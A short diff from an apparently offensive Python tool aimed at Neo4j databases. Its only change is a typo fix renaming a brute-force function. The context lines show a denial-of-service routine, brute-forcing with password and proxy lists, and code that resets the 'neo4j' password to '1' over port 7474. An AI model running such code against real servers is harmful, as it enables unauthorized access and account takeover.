@@ -41,7 +41,7 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
 
-def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
+def bruteForce_Neo4j(ip,dictpassw,dictproxies,headers):
 	d = {}
 	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
 	data = '{"password":"1"}'
@@ -190,7 +190,7 @@ def analyzeIP_Neo4j(ip,args):
 					data_report["version"] = "< 3.X"
 					data_report["ip"] = ip
 	        		if args.bruteForce == True:
-					passwd_old = brutteForce_Neo4j(ip,args.listPassw,args.listProxies,headers)
+					passwd_old = bruteForce_Neo4j(ip,args.listPassw,args.listProxies,headers)
 					r = requests.get(url,auth=('neo4j', '1'),timeout=1)
 					if (r.status_code == 200):
 						print "New password: 1"
